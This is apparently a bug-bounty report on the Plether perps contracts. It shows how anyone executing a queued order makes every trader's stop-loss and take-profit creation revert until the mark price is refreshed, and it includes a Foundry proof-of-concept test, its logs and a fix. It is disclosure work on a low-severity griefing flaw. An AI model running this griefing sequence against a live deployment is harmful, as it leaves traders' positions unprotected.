# \#99975 [SC-Low] Any order execution makes every trader's stop-loss and take-profit creation revert until someone pays a fresh mark update, which an unprivileged actor can trigger on demand (griefing)

**Submitted on Nov 15th 2026 at 23:37:54 UTC by @v4rvl for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99975
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary

An order execution writes its Pyth tick into the engine mark but not into the oracle's accepted basket. From then on the engine mark is newer than the accepted basket. `PositionProtectionBook.createPositionProtection` reads the accepted basket through `getLatestPrice`, which reverts `PletherOracle__PriceOutOfOrder` when the basket is older than the engine mark. So after any execution, no trader can create a stop-loss or take-profit until someone posts `updateMarkPrice`.

Anyone can execute a queued order. A griefer X queues a small order of its own and executes it whenever it wants. In the test the victim A then cannot protect its 500-lot position: the call reverts at 0, 5 and 20 seconds after X's execution. In the control, the same call from the same state is accepted. X's forcing action costs 395,010 atoms of USDG (the fees of its own 10-lot close) plus gas; the fixture's MockPyth charges no update fee (0 wei printed). A must send a second transaction, `updateMarkPrice`, and pay its Pyth fee on a live chain.

The honest keeper's ordinary execution produces the same state, so every trader meets the refusal after every execution unless someone refreshes the mark.

## Vulnerability Detail

1. **The order path writes only the engine mark.** `packages/perps/src/OrderRouterExecutionSidecar.sol:1053-1060`:

```solidity
    function _updateEngineMark(
        IOrderRouterExecutionHost host,
        OracleResult memory result
    ) private {
        ICfdEngineCore engine_ = ICfdEngineCore(host.engine());
        if (result.publishTime > engine_.lastMarkTime()) {
            engine_.updateMarkPrice(result.neutralMarkPrice, result.publishTime);
        }
    }
```

   The order's historical tick does not become the oracle's accepted basket.

2. **The protection book reads the accepted basket with an ordering check.** `packages/perps/src/PositionProtectionBook.sol:880` calls `oracle.getLatestPrice(IPletherOracle.PriceMode.MarkRefresh)`. That view builds the snapshot with `enforcePublishOrder = true` (`packages/perps/src/PletherOracle.sol:571-579`) and reverts when the basket is older than the engine mark (`packages/perps/src/PletherOracle.sol:892-895`):

```solidity
        if (enforcePublishOrder) {
            uint64 markTime = engine.lastMarkTime();
            if (snapshot.publishTime < markTime) {
                revert PletherOracle__PriceOutOfOrder(snapshot.publishTime, markTime);
            }
```

3. **Only a mark refresh clears it.** `updateMarkPrice` installs a newer tick into both stores. Until then every `createPositionProtection` reverts, for every account (measured); `replacePositionProtection` and protected opens use the same check (by code reading).

4. **The trigger is permissionless.** `executeOrder` and `executeOrderBatch` are open to any caller. The griefer needs one queued order of its own.

## Impact

Program impact row (Medium): "Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)".

Measured in the test (`test_R1_attack_executionBlocksProtection` against `test_R1_control_protectionAccepted`):

| world | A createPositionProtection | A full-close commit | B open commit |
|---|---|---|---|
| control (X's order queued, not executed) | accepted | accepted | accepted |
| X executed its order, +0 s | reverts PriceOutOfOrder (0x8e3e110d) | accepted | accepted |
| +5 s | reverts PriceOutOfOrder | | |
| +20 s | reverts PriceOutOfOrder | | |
| after A pays updateMarkPrice | accepted | | |

- **Damage.** A trader cannot place a stop-loss or take-profit on a live position. The protection exists to close the position at a set price without the trader online; while it is refused, the position runs unprotected. The trader must pay a Pyth update and send a second transaction to get it accepted.
- **Every execution, in normal operation.** The order path writes the engine mark whenever the order's tick is newer than the engine mark (`packages/perps/src/OrderRouterExecutionSidecar.sol:1057-1059`) and never writes the accepted basket. The order's tick is the first tick after its commit, so it is normally the newest one. The refusal follows every such execution, by the honest keeper too (`test_R1_honestKeeperExecutionAlsoBlocks`). It lasts until someone calls `updateMarkPrice`; the documents state no keeper cadence for that call.
- **The documented precondition holds while the call is refused.** Creation requires thresholds "on the untriggered side of a fresh mark" (`packages/perps/WORKING_WITH_AI_AGENTS.md:249-250`). After the execution the engine mark is 1 s old, yet creation reverts.
- **Other entrypoints, by code reading.** `replacePositionProtection` (`packages/perps/src/PositionProtectionBook.sol:295`) and the attached protection of `commitProtectedOpen` (`packages/perps/src/PositionProtectionBook.sol:440`, `:463`) call the same `_freshProtectionObservation` and revert the same way. These two arms were not run in this test.
- **Cost to the griefer.** One small order of its own and one execution call: 395,010 atoms in the test (MockPyth fee 0).
- **Scale.** Every account is affected at once. The griefer can repeat after every refresh as long as it has a queued order with a newer tick.


## Proof of Concept

## Proof of Concept

### Steps to reproduce

1. Apply the release risk parameters through the timelocked owner path. Fund A, B and X.
2. A opens a 500-lot LONG, B a 500-lot SHORT, X a 10-lot LONG.
3. A fresh mark is posted. X commits a close of its 10 lots.
4. Control: A calls `createPositionProtection` (take-profit 0.99, stop-loss 1.01). Accepted.
5. Attack: X executes its own close with `executeOrderBatch`. A's `createPositionProtection` reverts `PletherOracle__PriceOutOfOrder` at 0, 5 and 20 seconds. A posts `updateMarkPrice`; the call is accepted.
6. Honest twin: the keeper executes X's order instead. Same refusal.

### Proof of concept

Save the file below as `packages/perps/test/perps/CommitGrief.t.sol` and run, from `packages/perps`:

```sh
forge test --match-path test/perps/CommitGrief.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

import {console2} from "forge-std/console2.sol";

import {OrderRouterPythTestBase} from "./shared/OrderRouterTestBase.sol";

/// After any order execution the engine mark is newer than the oracle's accepted basket, and every commitOrder
/// (open or close) reverts PletherOracle__PriceOutOfOrder until someone posts updateMarkPrice.
/// An unprivileged actor X forces this on a victim A by executing its own queued order.
/// Release risk parameters (DEPLOYMENT.md) through the timelocked owner path. Public entrypoints only.
contract T_h_ML2_CommitGrief is OrderRouterPythTestBase {
    address internal K = address(0x4EE9); // honest keeper
    address internal X = address(0xBADD); // griefer
    address internal A = address(0xA001); // victim with an open position
    address internal B = address(0xB002); // counterparty

    uint256 internal constant T0 = SETUP_TIMESTAMP + 10 hours; // Monday, live market
    uint256 internal constant FUND = 300_000e6;
    int64 internal px = 100_000_000;

    function _applyRelease() internal {
        IHousePool.PoolConfig memory pc = _currentPoolConfig();
        pc.maxSeniorExposureAssets = 40_000_000e6;
        pc.maxSeniorShareBps = 8_000;
        pc.seniorRateBps = 800;
        pool.proposePoolConfig(pc);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        ICfdEngineAdminHost.EngineRiskConfig memory config;
        config.riskParams = CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5_000,
            protocolShareBps: 0
        });
        config.executionFeeBps = 4;
        config.frozenCloseSpreadBps = 50;
        config.settlementBufferBps = 25;
        engineAdmin.proposeRiskConfig(config);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        engineAdmin.finalizeRiskConfig();
    }

    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    function _blob(int64 price, uint256 publishTime, uint256 prevPublishTime) internal pure returns (bytes[] memory d) {
        MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](2);
        u[0] = MockPyth.FeedUpdate(FEED_A, MockPyth.MockPrice(price, 0, int32(-8), publishTime, prevPublishTime));
        u[1] = MockPyth.FeedUpdate(FEED_B, MockPyth.MockPrice(price, 0, int32(-8), publishTime, prevPublishTime));
        d = new bytes[](1);
        d[0] = abi.encode(u);
    }

    function _tick(uint256 dt) internal {
        vm.warp(_now() + dt);
        vm.roll(vm.getBlockNumber() + 1);
    }

    /// Anyone posts a fresh price: oracle accepted basket and engine mark at publish time now-1.
    function _markBy(address who) internal {
        _tick(3);
        bytes[] memory b = _blob(px, _now() - 1, _now() - 2);
        vm.prank(who);
        router.updateMarkPrice{value: 0.01 ether}(b);
    }

    function _fund(address who, uint256 amt) internal {
        settlementToken.mint(who, amt);
        vm.startPrank(who);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(who, amt);
        vm.stopPrank();
        vm.deal(who, 1 ether);
    }

    function _request(CfdTypes.Side side, uint256 size, uint256 margin, bool isClose)
        internal
        view
        returns (OrderV3Types.OrderRequest memory request)
    {
        request.clientOrderId = keccak256(abi.encode("ML2", router.nextCommitId(), side, size, isClose, _now()));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.isClose = isClose;
        if (isClose) {
            request.targetPrice = side == CfdTypes.Side.LONG ? engine.CAP_PRICE() : 1;
        } else {
            request.targetPrice = side == CfdTypes.Side.LONG ? 1 : engine.CAP_PRICE();
        }
        uint256 window = router.maxExecutionWindowSeconds();
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(_now() + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _commit(address who, OrderV3Types.OrderRequest memory r) internal returns (uint64 id) {
        vm.prank(who);
        id = router.commitOrder(r);
    }

    function _tryCommit(address who, OrderV3Types.OrderRequest memory r) internal returns (bool ok, bytes memory err) {
        vm.prank(who);
        try router.commitOrder(r) returns (uint64) {
            return (true, "");
        } catch (bytes memory e) {
            return (false, e);
        }
    }

    function _execBy(address exec, uint64 maxId) internal {
        _tick(2);
        bytes[] memory b = _blob(px, _now() - 1, _now() - 100);
        vm.prank(exec);
        router.executeOrderBatch{value: 0.01 ether}(maxId, b);
    }

    function _open(address who, CfdTypes.Side side, uint256 lots) internal returns (uint64 id) {
        _markBy(K);
        _tick(1);
        id = _commit(who, _request(side, lots * 1e20, lots * 1e7, false));
        _execBy(K, id);
        require(router.lifecycleBook().lifecycleStatus(id) == OrderV3Types.LifecycleStatus.Executed, "open exec");
    }

    function _size(address who) internal view returns (uint256 s) {
        (s,,,,,,) = engine.positions(who);
    }

    function _usd(address who) internal view returns (uint256) {
        return clearinghouse.balanceAssets(who) + engine.traderClaimBalanceAssets(who) + settlementToken.balanceOf(who);
    }

    function _sel(bytes memory e) internal pure returns (bytes4 s) {
        if (e.length >= 4) {
            assembly {
                s := mload(add(e, 32))
            }
        }
    }

    /// Common state: A LONG 500 lots, B SHORT 500 lots, X LONG 10 lots. X has one more 10-lot close committed and queued.
    function _world() internal returns (uint64 xQueued) {
        _applyRelease();
        vm.warp(T0);
        vm.deal(K, 10 ether);
        _markBy(K);
        _fund(A, FUND);
        _fund(B, FUND);
        _fund(X, 10_000e6);
        vm.deal(K, 10 ether);
        _open(A, CfdTypes.Side.LONG, 500);
        _open(B, CfdTypes.Side.SHORT, 500);
        _open(X, CfdTypes.Side.LONG, 10);
        // a fresh mark is posted; then X queues a close of its own 10-lot position
        _markBy(K);
        _tick(1);
        xQueued = _commit(X, _request(CfdTypes.Side.LONG, 10 * 1e20, 0, true));
        _tick(1);
    }

    function _log(string memory tag) internal view {
        console2.log(tag);
        console2.log("  engine lastMarkTime", uint256(engine.lastMarkTime()));
        console2.log("  block.timestamp", _now());
    }

    function _params(uint256 tp, uint256 sl) internal pure returns (PositionProtectionTypes.PositionProtectionParams memory p) {
        p.takeProfitTriggerPrice = tp;
        p.stopLossTriggerPrice = sl;
        p.closeLimits = PositionProtectionTypes.CloseFinancialLimits(
            type(uint256).max, type(uint256).max, type(uint256).max, type(uint256).max
        );
    }

    /// A protects its 500-lot LONG: take-profit at 0.99, stop-loss at 1.01 (a LONG wins when the basket falls).
    function _tryProtect(address who) internal returns (bool ok, bytes memory err) {
        IPositionProtectionActions book = IPositionProtectionActions(address(router.positionProtectionBook()));
        vm.prank(who);
        try book.createPositionProtection(_params(99_000_000, 101_000_000)) returns (uint64) {
            return (true, "");
        } catch (bytes memory e) {
            return (false, e);
        }
    }

    function _logRes(string memory what, bool ok, bytes memory e) internal pure {
        console2.log(what, ok);
        console2.logBytes4(_sel(e));
    }

    function _probeClose() internal {
        uint256 snap = vm.snapshotState();
        (bool c, bytes memory ce) = _tryCommit(A, _request(CfdTypes.Side.LONG, _size(A), 0, true));
        _logRes("    A full-close commit accepted", c, ce);
        vm.revertToState(snap);
    }

    function _probeOpen() internal {
        uint256 snap = vm.snapshotState();
        (bool o, bytes memory oe) = _tryCommit(B, _request(CfdTypes.Side.SHORT, 10 * 1e20, 10 * 1e7, false));
        _logRes("    B open commit accepted", o, oe);
        vm.revertToState(snap);
    }

    function _probe(string memory tag) internal returns (bool protOk, bytes4 protSel) {
        console2.log(tag);
        _probeClose();
        _probeOpen();
        bytes memory pe;
        (protOk, pe) = _tryProtect(A);
        _logRes("    A createPositionProtection accepted", protOk, pe);
        protSel = _sel(pe);
    }

    // CONTROL: same state, X's queued close is not executed. A protects its position: accepted.
    function test_R1_control_protectionAccepted() public {
        _world();
        _log("CONTROL");
        (bool ok,) = _probe("  CONTROL probes");
        assertTrue(ok, "control protection must be accepted");
    }

    // ATTACK: X executes its own queued close through the permissionless executeOrderBatch. A's stop-loss/take-profit
    // creation is then refused at 0, 5 and 20 s, until someone posts updateMarkPrice; A pays that update itself.
    function test_R1_attack_executionBlocksProtection() public {
        uint64 xId = _world();
        uint256 xUsd0 = _usd(X);
        uint256 xEth0 = X.balance;
        _execBy(X, xId);
        require(router.lifecycleBook().lifecycleStatus(xId) == OrderV3Types.LifecycleStatus.Executed, "x exec");
        console2.log("ATTACK: X executed its own queued 10-lot close, order id", uint256(xId));
        console2.log("  X USDG delta of the forcing action (atoms: its own close, fees, bounty back)");
        console2.logInt(int256(_usd(X)) - int256(xUsd0));
        console2.log("  X ETH spent (wei)", xEth0 - X.balance);
        _log("ATTACK after X's execution");
        uint256[3] memory waits = [uint256(0), 5, 20];
        uint256 prev;
        for (uint256 i; i < waits.length; ++i) {
            if (waits[i] > prev) _tick(waits[i] - prev);
            prev = waits[i];
            console2.log("  seconds after X's execution", waits[i]);
            (bool ok, bytes4 sel) = _probe("  ATTACK probes");
            assertFalse(ok, "protection must be refused");
            assertEq(sel, IPletherOracle.PletherOracle__PriceOutOfOrder.selector, "PriceOutOfOrder");
        }
        uint256 aEth0 = A.balance;
        _markBy(A);
        console2.log("  A ETH spent on its own updateMarkPrice (wei)", aEth0 - A.balance);
        (bool okc,) = _probe("  after A's own updateMarkPrice");
        assertTrue(okc, "cure");
    }

    // HONEST TWIN: the honest keeper K executes the same queued order. The same refusal follows.
    function test_R1_honestKeeperExecutionAlsoBlocks() public {
        uint64 xId = _world();
        _execBy(K, xId);
        (bool ok, bytes4 sel) = _probe("HONEST TWIN probes (K executed)");
        assertFalse(ok);
        assertEq(sel, IPletherOracle.PletherOracle__PriceOutOfOrder.selector);
    }
}
```

### Output

```text
Ran 3 tests for test/perps/T_h_ML2_CommitGrief.t.sol:T_h_ML2_CommitGrief
[PASS] test_R1_attack_executionBlocksProtection() (gas: 30066191)
Logs:
  ATTACK: X executed its own queued 10-lot close, order id 4
    X USDG delta of the forcing action (atoms: its own close, fees, bounty back)
  -395010
    X ETH spent (wei) 0
  ATTACK after X's execution
    engine lastMarkTime 1709568027
    block.timestamp 1709568028
    seconds after X's execution 0
    ATTACK probes
      A full-close commit accepted true
  0x00000000
      B open commit accepted true
  0x00000000
      A createPositionProtection accepted false
  0x8e3e110d
    seconds after X's execution 5
    ATTACK probes
      A full-close commit accepted true
  0x00000000
      B open commit accepted true
  0x00000000
      A createPositionProtection accepted false
  0x8e3e110d
    seconds after X's execution 20
    ATTACK probes
      A full-close commit accepted true
  0x00000000
      B open commit accepted true
  0x00000000
      A createPositionProtection accepted false
  0x8e3e110d
    A ETH spent on its own updateMarkPrice (wei) 0
    after A's own updateMarkPrice
      A full-close commit accepted true
  0x00000000
      B open commit accepted true
  0x00000000
      A createPositionProtection accepted true
  0x00000000

[PASS] test_R1_control_protectionAccepted() (gas: 17660471)
Logs:
  CONTROL
    engine lastMarkTime 1709568023
    block.timestamp 1709568026
    CONTROL probes
      A full-close commit accepted true
  0x00000000
      B open commit accepted true
  0x00000000
      A createPositionProtection accepted true
  0x00000000

[PASS] test_R1_honestKeeperExecutionAlsoBlocks() (gas: 18427583)
Logs:
  HONEST TWIN probes (K executed)
      A full-close commit accepted true
  0x00000000
      B open commit accepted true
  0x00000000
      A createPositionProtection accepted false
  0x8e3e110d

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 40.91ms (89.18ms CPU time)
```

## Recommendation

Keep the two mark stores consistent on the order path. When an execution installs a newer engine mark, also install the same accepted basket in the oracle (the router already holds the parsed tick). Alternatively, let the protection book accept an engine mark that is newer than the accepted basket instead of reverting.

## Limits

- **One public call cures it.** The victim can post `updateMarkPrice` itself and retry.
- **Bounded window.** Without any refresh, creation fails anyway once the mark is older than the 60 s default staleness limit (`packages/perps/src/PletherOracle.sol:76`). The refusal matters inside that window, while the mark is fresh.
- **No funds move.** Closes and plain commits are not affected (see the probes in the output).
- **The revert is a defence.** It is the ordering check that protects protection geometry against stale prices (the fix for AI audit MED-28 covers the opposite direction). The report does not dispute the check. It shows that the protocol's own order path creates the inconsistent state, and that anyone can create it on demand.
- **The fixture's `MockPyth` stands in for Pyth and its token for USDG.**

## References

- `packages/perps/src/OrderRouterExecutionSidecar.sol:1053-1060`: the order path writes the engine mark only.
- `packages/perps/src/PositionProtectionBook.sol:862-895`: protection reads the accepted basket and requires it installed.
- `packages/perps/src/PletherOracle.sol:345-349`, `:565-579`, `:888-901`: `getLatestPrice` and the ordering check.
